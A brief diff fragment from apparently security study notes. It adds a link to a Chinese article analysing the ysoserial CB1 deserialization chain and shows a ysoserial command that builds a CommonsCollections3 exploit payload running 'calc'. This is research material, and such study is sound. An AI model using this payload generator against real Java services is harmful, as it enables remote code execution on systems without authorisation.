@@ -1,3 +1,5 @@
+[『代码审计』ysoserial CB1 反序列化分析](https://mp.weixin.qq.com/s/Pbxw79a1klGTwwYgeDhYqw)
+
 ```bash
 java -jar ysoserial-all.jar CommonsCollections3 "calc" > cc3.txt
 
